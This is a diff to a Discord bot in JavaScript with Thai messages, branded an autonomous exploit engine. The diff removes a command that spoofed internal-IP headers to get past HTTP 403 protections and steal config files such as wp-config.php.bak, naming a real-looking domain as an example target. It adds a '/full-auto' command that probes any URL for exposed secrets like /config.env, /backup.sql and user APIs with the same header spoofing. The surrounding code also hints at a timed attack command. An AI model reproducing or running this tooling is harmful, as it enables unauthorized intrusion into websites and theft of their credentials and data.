@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - 403 BYPASS & CONFIG STEALER ENGINE v8
+ * JEFF FUJI - FULL-STACK AUTONOMOUS EXPLOIT ENGINE v9
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -51,11 +51,11 @@ client.once('ready', async () => {
                     .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                     .setRequired(true)),
         new SlashCommandBuilder()
-            .setName('bypass-config')
-            .setDescription('พยายามบายพาสกำแพง 403 และดึงไฟล์ Config เป้าหมายอัตโนมัติ')
+            .setName('full-auto')
+            .setDescription('สแกน เจาะลึก และบายพาสเป้าหมายแบบอัตโนมัติเต็มระบบด้วย URL เดียว')
             .addStringOption(option => 
                 option.setName('url')
-                    .setDescription('URL ไฟล์ที่ติด 403 (เช่น https://bewergame.com/wp-config.php.bak)')
+                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
                     .setRequired(true)),
         new SlashCommandBuilder()
             .setName('stop')
@@ -166,58 +166,65 @@ client.on('interactionCreate', async interaction => {
 
         attackTimers.push(timer);
 
-    } else if (commandName === 'bypass-config') {
+    } else if (commandName === 'full-auto') {
         const targetUrl = interaction.options.getString('url');
-        await interaction.reply(`🔓 **[403 BYPASS ENGINE]** กำลังส่งชุด Headers และเทคนิคหลบเลี่ยงเพื่อดึงข้อมูลจาก **${targetUrl}** รอแป๊บไอ้สัส...`);
+        await interaction.reply(`🤖 **[FULL-AUTO ENGINE]** กำลังระดมสแกน เจาะลึก และทดสอบบายพาส **${targetUrl}** เต็มระบบ รอรับรายงานแป๊บไอ้สัส...`);
 
         try {
-            const parsedUrl = new URL(targetUrl);
-            const reqLib = parsedUrl.protocol === 'https:' ? https : http;
+            const parsedBase = new URL(targetUrl);
+            const targets = [
+                '/admin', '/login.php', '/config.env', '/backup.sql', '/robots.txt',
+                '/sitemap.xml', '/wp-config.php.bak', '/api/v1/users', '/products.json'
+            ];
 
-            // เทคนิค Header Spoofing หลอกเซิร์ฟเวอร์ว่าเป็นแอดมินหรือมาจากภายใน
-            const bypassHeaders = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdminBypassClient/2.0',
-                'X-Forwarded-For': '127.0.0.1',
-                'X-Originating-IP': '127.0.0.1',
-                'X-Remote-IP': '127.0.0.1',
-                'X-Client-IP': '127.0.0.1',
-                'X-Forwarded-Host': parsedUrl.host,
-                'Referer': `${parsedUrl.protocol}//${parsedUrl.host}/admin`,
-                'Connection': 'close'
-            };
+            let findings = [];
+            let checked = 0;
 
-            const options = {
-                hostname: parsedUrl.hostname,
-                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                path: parsedUrl.pathname + parsedUrl.search,
-                method: 'GET',
-                headers: bypassHeaders,
-                agent: parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent
-            };
+            targets.forEach((path) => {
+                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${path}`;
+                const reqLib = parsedBase.protocol === 'https:' ? https : http;
 
-            const req = reqLib.request(options, (res) => {
-                let data = '';
-                res.on('data', (chunk) => { data += chunk; });
-                res.on('end', async () => {
-                    const isSuccess = res.statusCode === 200;
-                    const embed = new EmbedBuilder()
-                        .setTitle('💥 403 Bypass & Config Stealer Report')
-                        .setColor(isSuccess ? 0x22c55e : 0xf59e0b)
-                        .addFields(
-                            { name: 'Target URL', value: targetUrl },
-                            { name: 'Bypass Status', value: `HTTP Status: ${res.statusCode} ${res.statusMessage}` },
-                            { name: 'Payload Response', value: data.length > 0 ? `\`\`\`php\n${data.slice(0, 800)}\n\`\`\`` : '*(Empty Response / Blocked)*' }
-                        )
-                        .setTimestamp();
+                const req = reqLib.get(testUrl, {
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) FullAutoEngine/3.0',
+                        'X-Forwarded-For': '127.0.0.1',
+                        'X-Originating-IP': '127.0.0.1'
+                    }
+                }, (res) => {
+                    checked++;
+                    if (res.statusCode === 200) {
+                        findings.push(`🟢 **[OPEN 200]** \`${testUrl}\``);
+                    } else if (res.statusCode === 403) {
+                        findings.push(`🟡 **[LOCKED 403]** \`${testUrl}\``);
+                    }
 
-                    await interaction.followUp({ embeds: [embed] });
+                    if (checked === targets.length) {
+                        sendFullReport();
+                    }
                 });
+
+                req.on('error', () => {
+                    checked++;
+                    if (checked === targets.length) {
+                        sendFullReport();
+                    }
+                });
+                req.end();
             });
 
-            req.on('error', async (err) => {
-                await interaction.followUp(`❌ Bypass ล้มเหลว: ${err.message}`);
-            });
-            req.end();
+            async function sendFullReport() {
+                const embed = new EmbedBuilder()
+                    .setTitle('💀 Full-Stack Autonomous Exploit Report')
+                    .setColor(findings.length > 0 ? 0x22c55e : 0xef4444)
+                    .setDescription(findings.length > 0 ? findings.join('\n') : '❌ ไม่พบจุดรั่วไหลในชุดสแกนอัตโนมัติเต็มระบบ')
+                    .addFields(
+                        { name: 'Target Analyzed', value: targetUrl },
+                        { name: 'Engine Status', value: '🟢 Full Recon & Bypass Completed' }
+                    )
+                    .setTimestamp();
+
+                await interaction.followUp({ embeds: [embed] });
+            }
 
         } catch (err) {
             await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
